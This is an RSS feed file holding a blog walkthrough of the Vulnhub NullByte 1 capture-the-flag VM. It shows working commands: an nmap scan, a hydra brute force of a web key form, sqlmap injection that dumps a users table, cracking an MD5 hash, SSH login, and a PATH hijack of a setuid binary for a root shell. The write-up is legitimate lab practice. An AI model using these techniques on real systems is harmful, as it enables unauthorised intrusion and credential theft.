@@ -1,0 +1,238 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Nb0x01 on Unlogic</title>
+    <link>http://unlogic.co.uk/tags/nb0x01/</link>
+    <description>Recent content in Nb0x01 on Unlogic</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Tue, 25 Aug 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://unlogic.co.uk/tags/nb0x01/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Nullbyte 1 solution</title>
+      <link>http://unlogic.co.uk/2015/08/25/nullbyte-1-solution/</link>
+      <pubDate>Tue, 25 Aug 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://unlogic.co.uk/2015/08/25/nullbyte-1-solution/</guid>
+      <description>
+
+&lt;p&gt;I&amp;rsquo;ve been AFK for a while because of various reasons, but now I&amp;rsquo;m back and have
+managed to scrape a little time together to get on with some of &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&amp;rsquo;s&lt;/a&gt;
+new VMs.&lt;/p&gt;
+
+&lt;p&gt;So let&amp;rsquo;s start with &lt;a href=&#34;https://www.vulnhub.com/entry/nullbyte-1,126/&#34;&gt;Nullbyte 1&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;stage-1:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 1&lt;/h1&gt;
+
+&lt;p&gt;I ran the usual service discovery and found:&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sV 192.168.56.101
+
+Starting Nmap 6.49BETA4 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; at 2015-08-25 11:29 BST
+Nmap scan report &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.101
+Host is up &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;0.00057s latency&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color: #ae81ff&#34;&gt;997&lt;/span&gt; closed ports
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Apache httpd 2.4.10 &lt;span style=&#34;color: #f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color: #f92672&#34;&gt;))&lt;/span&gt;
+111/tcp open  rpcbind 2-4 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;RPC &lt;span style=&#34;color: #75715e&#34;&gt;#100000)&lt;/span&gt;
+777/tcp open  ssh     OpenSSH 6.7p1 Debian &lt;span style=&#34;color: #ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;HTTP server on 80 and ssh on 777. I&amp;rsquo;m going to take the straightforward one, and head
+to the HTTP server first.&lt;/p&gt;
+
+&lt;p&gt;Upon opening the page I only get an image and some text&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;http://i.imgur.com/SlVGKol.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I ran &lt;code&gt;dirbuster&lt;/code&gt; on the root and got a couple of hits: &lt;code&gt;uploads&lt;/code&gt; and &lt;code&gt;phpmyadmin&lt;/code&gt;. The first had disabled directory listing
+and the second was a no go, but at least told me there was a SQL server available somewhere.&lt;/p&gt;
+
+&lt;p&gt;The source of the page doesn&amp;rsquo;t reveal anything else either, so that last place we might be able to find something
+is the image itself. There doesn&amp;rsquo;t appear to be any steganography involved here and nothing in the hexdump of the image
+either. Well, let me take a look at the EXIF data then.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/Downloads# exiftool main.gif 
+ExifTool Version Number         : 9.74
+File Name                       : main.gif
+Directory                       : .
+File Size                       : &lt;span style=&#34;color: #ae81ff&#34;&gt;16&lt;/span&gt; kB
+File Modification Date/Time     : 2015:08:25 10:27:37+01:00
+File Access Date/Time           : 2015:08:25 10:28:35+01:00
+File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
+File Permissions                : rw-r--r--
+File Type                       : GIF
+MIME Type                       : image/gif
+GIF Version                     : 89a
+Image Width                     : 235
+Image Height                    : 302
+Has Color Map                   : No
+Color Resolution Depth          : 8
+Bits Per Pixel                  : 1
+Background Color                : 0
+Comment                         : P-&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;: kzMb5nVYJw
+Image Size                      : 235x302
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Hrmm, that comment looks unusual. Let&amp;rsquo;s try that in the URL. Initially I got a 404
+but that&amp;rsquo;s because I didn&amp;rsquo;t remove the &lt;code&gt;P-):&lt;/code&gt;. Hitting &lt;code&gt;http://192.168.56.101/kzMb5nVYJw&lt;/code&gt;
+takes me to a form asking for a key.&lt;/p&gt;
+
+&lt;h1 id=&#34;stage-2:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 2&lt;/h1&gt;
+
+&lt;p&gt;Typing in something random just shows &lt;code&gt;invalid key&lt;/code&gt;. Ok, let me take a look at the source,
+see where this thing goes.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
+&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;form&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;method=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;action=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+Key:&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt; 
+&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
+&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!-- this form isn&amp;#39;t connected to mysql, password ain&amp;#39;t that complex --!&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Ok, so no SQLi here then, and the password isn&amp;rsquo;t complex either. I&amp;rsquo;m guessing
+a simple wordlist might solve this for me. Time to break out &lt;code&gt;hydra&lt;/code&gt; for this:&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# hydra 192.168.56.101 http-form-post &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&amp;quot;&lt;/span&gt; -l x -P /usr/share/dict/words -t &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; -w 30
+Hydra v8.1 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;c&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; illegal purposes.
+
+Hydra &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; starting at 2015-08-25 11:41:58
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; max &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; tasks per &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; server, overall &lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt; tasks, &lt;span style=&#34;color: #ae81ff&#34;&gt;99171&lt;/span&gt; login tries &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;l:1/p:99171&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;, ~154 tries per task
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; attacking service http-post-form on port 80
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;STATUS&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; 18687.00 tries/min, &lt;span style=&#34;color: #ae81ff&#34;&gt;18687&lt;/span&gt; tries in 00:01h, &lt;span style=&#34;color: #ae81ff&#34;&gt;80484&lt;/span&gt; todo in 00:05h, &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; active
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;80&lt;span style=&#34;color: #f92672&#34;&gt;][&lt;/span&gt;http-post-form&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; host: 192.168.56.101   login: x   password: elite
+&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; of &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; target successfully completed, &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; valid password found
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Bingo. Once I enter that into the field I am able to search for usernames.&lt;/p&gt;
+
+&lt;h1 id=&#34;stage-3:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 3&lt;/h1&gt;
+
+&lt;p&gt;Entering all sorts of names reveals nothing. At this point I am guessing this
+is the part that is backed by a SQL database. Although usernames and the usual
+SQLi synbols don&amp;rsquo;t do much, entering nothing dumps multiple records. Maybe I will
+try to &lt;code&gt;sqlmap&lt;/code&gt; the URL to see if there&amp;rsquo;s any vulnerabilities there&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;
+
+&amp;lt;snip&amp;gt;
+
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; GET parameter &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; seems to be &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)&amp;#39;&lt;/span&gt; injectable 
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; testing &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Generic UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; testing &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; automatically extending ranges &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; UNION query injection technique tests as there is at least one other &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;potential&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; technique found
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; ORDER BY technique seems to be usable. This should reduce the &lt;span style=&#34;color: #f8f8f2&#34;&gt;time &lt;/span&gt;needed to find the right number of query columns. Automatically extending the range &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; current UNION query injection technique &lt;span style=&#34;color: #f8f8f2&#34;&gt;test&lt;/span&gt;
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; target URL appears to have &lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt; columns in query
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; GET parameter &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; is &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt; injectable
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Result! Using this we can now dump the databasenames, tables, and data in the DB&lt;/p&gt;
+
+&lt;p&gt;(output shortened for clarity)
+&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --current-db
+back-end DBMS: MySQL 5.0.12
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:44&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; fetching current database
+current database:    &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;seth&amp;#39;&lt;/span&gt;
+
+root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --tables -D seth
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:55&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; fetching tables &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; database: &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;seth&amp;#39;&lt;/span&gt;
+Database: seth
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; table&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
++-------+
+&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; users &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
++-------+
+
+
+root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --dump -D seth -T users
+Database: seth
+Table: users
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt; entries&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
++----+---------------------------------------------+--------+------------+
+&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; id &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; pass                                        &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; user   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; position   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
++----+---------------------------------------------+--------+------------+
+&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ramses &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;    &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; --not allowed--                             &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; isis   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; employee   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
++----+---------------------------------------------+--------+------------+
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;An MD5 hashed password? I best put that through &lt;a href=&#34;http://md5decoder.org/&#34;&gt;md5decoder&lt;/a&gt; to
+be rewarded with the password &lt;code&gt;omega&lt;/code&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;stage-4:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;stage 4&lt;/h1&gt;
+
+&lt;p&gt;Turns out that this is ramses&amp;rsquo;s password on the ssh service that&amp;rsquo;s running on
+port 777 on the VM. So I&amp;rsquo;ll connect to that and have a look at what&amp;rsquo;s going on there.&lt;/p&gt;
+
+&lt;p&gt;Not much in his home directory, so I&amp;rsquo;ll checkout what he&amp;rsquo;s been up to&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:~&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;cat .bash_history 
+sudo -s
+su eric
+&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit&lt;/span&gt;
+ls
+clear
+&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /var/www
+&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd &lt;/span&gt;backup/
+ls
+./procwatch 
+clear
+sudo -s
+&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /
+ls
+&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Interesting, ramses has something in &lt;code&gt;/var/www&lt;/code&gt;. Seems like a setuid root
+binary called &lt;code&gt;procwatch&lt;/code&gt;. After running it I would assume that it&amp;rsquo;s just running &lt;code&gt;ps&lt;/code&gt;
+to return a list of processes. If I run &lt;code&gt;ps&lt;/code&gt; on its own, I get the same output (minus
+procwatch of course)&lt;/p&gt;
+
+&lt;p&gt;So let&amp;rsquo;s see if it calls &lt;code&gt;ps&lt;/code&gt; with an absolute path, or not. As a quick test I&amp;rsquo;ll create
+a symlink to &lt;code&gt;ls&lt;/code&gt; in the current directory and name it &lt;code&gt;ps&lt;/code&gt;. Then I set the &lt;code&gt;PATH&lt;/code&gt; environment variable
+with the current dir at the front.&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;ln -s /bin/ls ps
+ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ export PATH&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;pwd&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;:&lt;span style=&#34;color: #e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;PATH&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;
+ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;./procwatch 
+ls  procwatch  ps  readme.txt
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Excellent, it just calls &lt;code&gt;ps&lt;/code&gt; without a path. A classic issue you can often
+find in programs that call other programs.&lt;/p&gt;
+
+&lt;p&gt;So let me leverage this to get myself a root shell and ultimately the flag&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;ln -snf /bin/sh ps
+ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;./procwatch 
+&lt;span style=&#34;color: #75715e&#34;&gt;# whoami &lt;/span&gt;
+root
+&lt;span style=&#34;color: #75715e&#34;&gt;# cat /root/proof.txt&lt;/span&gt;
+&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;OUTPUT CUT&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And that concludes the NullByte VM walkthrough. A nice little machine with some fun
+challenges. Thanks to ly0n for creating it.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
